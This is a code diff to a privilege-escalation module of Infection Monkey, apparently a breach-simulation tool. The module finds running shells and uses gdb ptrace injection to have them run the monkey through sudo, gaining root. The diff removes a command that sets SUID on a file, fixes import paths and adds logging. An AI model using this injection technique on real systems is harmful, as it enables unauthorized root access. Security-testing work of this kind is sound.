@@ -5,8 +5,8 @@
 """
 import os
 import subprocess
-from infection_monkey.pe import HostPrivExploiter
-from infection_monkey.pe.tools import shell, check_system, check_running
+from infection_monkey.pe.actions import HostPrivExploiter
+from infection_monkey.pe.actions.tools import shell, check_system, check_running
 from logging import getLogger
 
 LOG = getLogger(__name__)
@@ -14,11 +14,9 @@ LOG = getLogger(__name__)
 __author__ = "D3fa1t"
 
 pidOfShells = "pgrep '^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$'"  # list of all well known shells
-setSUID = "echo 'call system(\"echo | sudo -S chown root %(file)s >/dev/null 2>&1 && echo" \
-          " | sudo -S chmod +s root %(file)s >/dev/null 2>&1 \")' "  # Command that sets the SUID bit on the monkey.
 runMonkey = "echo 'call system(\"echo | sudo -S %(commandline)s >/dev/null 2>&1 \")' "
 ptrace_scope = "cat /proc/sys/kernel/yama/ptrace_scope"
-GDB = "gdb -q -n -p %(pid)s"  # connect to process pid
+GDB = "gdb -q -n -p %(pid)s "  # connect to process pid
 
 
 def check():
@@ -38,7 +36,6 @@ class PtraceScopeExploiter(HostPrivExploiter):
         self.file_name = ""
         self.runnableDistro = ("ubuntu", "linux")
 
-    @staticmethod
     def try_priv_esc(self, command_line):
         """
         The function takes in the command line to run the monkey as an argument
@@ -64,7 +61,8 @@ class PtraceScopeExploiter(HostPrivExploiter):
         for pid in pidlist:
             # ("Trying to inject %s" % pid)
             gdb = GDB % {'pid': pid}
-            run_monkey = runMonkey % {'commandline':command_line}
+            run_monkey = runMonkey % {'commandline': command_line}
+            print(run_monkey + " | " + gdb)
             shell(run_monkey + " | " + gdb)
 
             # Check if the injection was successful by checking if the owner of the monkey is root
@@ -76,6 +74,7 @@ class PtraceScopeExploiter(HostPrivExploiter):
                 return True
 
         # Privilege escalation failed
+        LOG.info("Ptrace_scope Privilege escalation was not successful!")
         return False
 
 
